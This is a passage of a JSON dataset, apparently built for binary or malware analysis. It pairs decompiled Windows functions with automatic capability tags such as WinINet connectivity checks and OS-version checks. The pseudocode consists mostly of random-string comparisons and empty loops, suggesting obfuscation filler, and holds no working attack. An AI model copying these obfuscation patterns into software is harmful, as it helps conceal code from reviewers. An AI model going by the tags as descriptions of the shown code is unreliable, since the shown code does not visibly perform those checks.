        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042321e(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    char cVar1;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_c0h;\n    uint var_a8h;\n    uint var_90h;\n    uint var_78h;\n    uint var_5dh;\n    uchar var_59h;\n    uchar var_58h [27];\n    uint var_3dh;\n    uchar var_22h;\n    uint var_21h;\n    ulong uStack28;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"mwgxrbtb\", &var_5dh);\n    fcn.00483140();\n    var_10h = 0x8ca;\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_5dh + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x51f75c, &var_5dh + 2);\n    fcn.00483140();\n    uStack28 = *0x523010;\n    stack0xffffffdc = *0x523018;\n    fcn.00483110();\n    fcn.004b21e0(\"tvravukbmapbnzpxlcqrauorqkbhzsmhhrepus\", &var_5dh + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"clikgzmuoenwzrzmklmmtorugwfnmshlukznkqeyvupbbbajolmjmfrxihpgeaoooqfaudmxypdgohzryzrrkeczomtdq\", \n                 &var_59h);\n    fcn.00483140();\n    var_21h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(0x51f75c, &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(0x51f75c, &var_22h);\n    cVar1 = fcn.004c1070(&var_3dh + 1, var_58h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x12; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 808
    },
    "00423534": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00423534(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_44h;\n    uint var_2ah;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    var_14h = 0x366;\n    fcn.00483110();\n    fcn.004b21e0(0x51f7e6, &var_2ah);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wgpigkzanopjzxziguzquqmznpvthnjlvehwvnralzayfylnjlxdfaksvyeobyeysvhogbrv\", &var_2ah + 1);\n    fcn.00483140();\n    var_15h = 0;\n    var_1ch = 0xb21;\n    var_20h = 0x5d;\n    stack0xffffffd4 = *0x523020;\n    for (stack0xfffffff0 = 0x46; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 483
    },
    "00423666": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00423666(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    char cVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_9ch;\n    uint var_81h;\n    uint var_65h;\n    uint var_49h;\n    uint var_2dh;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"lbzluafrbdswlfblkoytpudoednxcqplqfvzqbjuqstsljybykudvjygemhlae\", &var_81h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lbzluafrbdswlfblkoytpudoednxcqplqfvzqbjuqstsljybykudvjygemhlae\", &var_65h);\n    fcn.00483110();\n    fcn.004b21e0(\"lbzluafrbdswlfblkoytpudoednxcqplqfvzqbjuqstsljybykudvjygemhlae\", &var_49h);\n    cVar1 = fcn.004c09a0(&var_65h + 1, &var_81h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 4; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"lbzluafrbdswlfblkoytpudoednxcqplqfvzqbjuqstsljybykudvjygemhlae\", &var_2dh);\n    fcn.00483110();\n    fcn.004b21e0(\"lbzluafrbdswlfblkoytpudoednxcqplqfvzqbjuqstsljybykudvjygemhlae\", &var_11h);\n    cVar1 = fcn.004c09a0(&var_2dh + 1, &var_49h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffec = 0x59; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n        }\n    }\n    fcn.004b2800();\n    return 0xa6c9;\n}\n",
        "token_count": 737
    },
    "004238a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004238a8(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint noname_8, uint arg_2ch)\n\n{\n    uint in_ECX;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_1ah;\n    uint var_19h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x523028;\n    var_19h._0_1_ = 0;\n    for (var_ch = 0x49; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"mhqmxo\", &var_1ah);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 286
    },
    "00424658": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00424658(uint noname_0, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h)\n\n{\n    char cVar1;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d0h;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_70h;\n    uchar var_6ch [27];\n    uint var_51h;\n    uchar var_35h;\n    uint var_34h;\n    ulong uStack52;\n    uint var_21h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ehkhiujklihtzdmkjvwocderonkagdelusiernhoenccfbaaetrzhxcrnfmqnmvq\", &var_70h);\n    fcn.00483140();\n    var_10h = 0x883;\n    var_14h = 0x96c;\n    stack0xffffffdc = *0x523100;\n    fcn.00483110();\n    fcn.004b21e0(\"yqaaeivbqahozdmamohvwcmvpof\", &var_70h + 1);\n    fcn.00483140();\n    var_21h._0_1_ = 0;\n    uStack52 = *0x523108;\n    fcn.00483110();\n    fcn.004b21e0(\"zzfkyoesvvekkhruztedsptxuhjkvgwpvelrxolxutorkbehvsynjgpzxdhptgfdckvxganyb\", &var_70h + 2);\n    fcn.00483140();\n    var_34h = 0x42a;\n    fcn.00483110();\n    fcn.004b21e0(\"wxtqblpcvhxhwjawxbmkysyzwlrqqvhfvhlmkfbxarttzkmqxajqohceuinlozmcgyrpaqsaxxdypkogweab\", &var_70h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"yqaaeivbqahozdmamohvwcmvpof\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"yqaaeivbqahozdmamohvwcmvpof\", &var_35h);\n    cVar1 = fcn.004c1070(&var_51h + 1, var_6ch);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x34; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 842
    },
    "00424918": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424918(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_4h;\n    \n    for (var_4h = 0x32; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00424974": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00424974(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint noname_9, uint arg_30h, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ch;\n    uchar var_68h [27];\n    uint var_4dh;\n    uint var_31h;\n    ulong uStack44;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"uuoovbjeeqdlopltuotohienjpnhewaxmdktwdkipd\", &var_6ch);\n    fcn.00483140();\n    uStack28 = *0x523120;\n    fcn.00483110();\n    fcn.004b21e0(\"xsupltwbelzmyhnrlaodjkkkqzsysqznakborykcwrhybagbbyfzsaeqzkdpytiojlh\", &var_6ch + 1);\n    fcn.00483140();\n    var_1ch = 0x2e6;\n    fcn.00483110();\n    fcn.004b21e0(\"wvtfvxsjzhqzwzwtjabjhdrbirpmcmumjsikyicuxzndfayobptmwfinrrnfcobsfxyxtcqibhhnyimvcdydakzxeidbor\", \n                 &var_6ch + 2);\n    fcn.00483140();\n    uStack44 = *0x523128;\n    fcn.00483110();\n    fcn.004b21e0(\"kdimetztgulmzyuutxzhaahzjoic\", &var_6ch + 3);\n    fcn.00483140();\n    stack0xffffffcc = *0x523130;\n    fcn.00483110();\n    fcn.004b21e0(\"wvtfvxsjzhqzwzwtjabjhdrbirpmcmumjsikyicuxzndfayobptmwfinrrnfcobsfxyxtcqibhhnyimvcdydakzxeidbor\", \n                 &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"wvtfvxsjzhqzwzwtjabjhdrbirpmcmumjsikyicuxzndfayobptmwfinrrnfcobsfxyxtcqibhhnyimvcdydakzxeidbor\", \n                 &var_31h);\n    cVar1 = fcn.004c09a0(&var_4dh + 1, var_68h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x18; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 915
    },
    "00424c66": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00424c66(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_25h;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_12h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"cxqqkrbeertqwdebnkrnofxfupywwxkbtqwzfmqybkqy\", &var_25h);\n    fcn.00483140();\n    var_12h = 1;\n    var_18h = 0x1cc8;\n    var_1ch = 0x1b05;\n    var_1dh = 1;\n    var_1eh = 0;\n    stack0xffffffd8 = 0x1052;\n    for (var_ch = 0x26; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (stack0xffffffec = 0x4c; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 432
    },
    "00424d66": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00424d66(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x2d; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0xb2c8;\n}\n",
        "token_count": 174
    },
    "00424dbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00424dbc(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6bh;\n    uint var_4dh;\n    uint var_31h;\n    uint var_21h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"wjizqlwjvhhzajrgndsegackdqljdveqlfznkpdbkbo\", &var_6bh);\n    fcn.00483140();\n    var_14h = 0x3cd;\n    stack0xffffffdc = *0x523138;\n    fcn.00483110();\n    fcn.004b21e0(\"ksgsrqexnpsppurguuyzozrwnappwklyfrsv\", &var_6bh + 1);\n    fcn.00483140();\n    var_21h._0_1_ = 0;\n    stack0xffffffcc = *0x523140;\n    fcn.00483110();\n    fcn.004b21e0(\"aqmcfxecqpifjnnuzazphmagzqoohqconvlshuggvmbvzxqovcmcqhafaiuecqzqmcn\", &var_6bh + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ksgsrqexnpsppurguuyzozrwnappwklyfrsv\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ksgsrqexnpsppurguuyzozrwnappwklyfrsv\", &var_31h);\n    cVar2 = fcn.004c1070(&var_4dh + 1, &var_6bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x523148;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x54; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 5; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 700
    },
    "00425018": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425018(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x3e; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (stack0xfffffff4 = 0x3c; 0 < stack0xfffffff4; unique0x00007a80 = stack0xfffffff4 + -1) {\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004250d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004250d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_dh;\n    \n    for (stack0xfffffff0 = 0x3f; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00425144": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __fastcall fcn.00425144(uint param_1)\n\n{\n    uint var_7ch;\n    uint var_70h;\n    uint var_58h;\n    uint var_40h;\n    uint var_25h;\n    uchar var_21h;\n    ulong uStack36;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x6c9;\n    fcn.00483110();\n    fcn.004b21e0(\"mtbjmogzquxapgxvzjfwpfhptjyxjyal\", &var_25h);\n    fcn.00483140();\n    var_14h = 0x24b;\n    var_18h = 0xaed;\n    uStack36 = *0x523170;\n    fcn.00483110();\n    fcn.004b21e0(\"vimmrcagcopwlzp\", &var_25h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ujagumryldyddnaqjhfqjlghkyzqonhecykhrnbduruyxkxpfiianpxkfhbplcscndjpqnzcuf\", &var_25h + 2);\n    fcn.00483140();\n    var_21h = 0;\n    for (var_ch = 0x41; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"xpisf\", &var_25h + 3);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 449
    },
    "00425d06": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00425d06(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x54; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x47; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    for (var_ch = 0x46; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x22; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "00425db4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00425db4(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_bdh;\n    uint var_a1h;\n    uint var_85h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    int32_t var_16h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_bdh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_a1h);\n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_85h);\n    cVar1 = fcn.004c09a0(&var_a1h + 1, &var_bdh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x2c; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_69h);\n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_4dh);\n    cVar1 = fcn.004c1070(&var_69h + 1, &var_85h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x10; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"otpugavjyankfpisiuyoiemmnuavyrifqangxalgcmbobwwrqtcrjknjkdpmiwjgurmovupzbokgykkchlhojjcaxqanudlo\", \n                 &var_16h);\n    cVar1 = fcn.004c09a0(&var_31h + 1, &var_4dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 0x2a; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"irajtclserid\", &var_16h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 1191
    },
    "004261a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004261a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    double dVar1;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_35h;\n    uchar var_31h;\n    uint var_30h;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_19h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x523200;\n    fcn.00483110();\n    fcn.004b21e0(\"gvzwnzaql\", &var_35h);\n    fcn.00483140();\n    var_19h._0_1_ = 0;\n    uStack44 = *0x523208;\n    fcn.00483110();\n    fcn.004b21e0(\"hjwamodbmjazohysoufafrzymvtqpviflwesmxdulgbvqwwajiflkwx\", &var_35h + 1);\n    fcn.00483140();\n    dVar1 = *0x523210;\n    var_2ch = 0x78;\n    var_30h = 0x9c;\n    var_31h = 0;\n    var_35h._3_1_ = 0;\n    var_35h._2_1_ = 1;\n    for (var_ch = 0x48; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 428
    },
    "004263b2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl\nfcn.004263b2(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    char cVar1;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f0h;\n    uint var_d8h;\n    uint var_c0h;\n    uint var_a8h;\n    uint var_90h;\n    uchar var_8ch [27];\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x523220;\n    fcn.00483110();\n    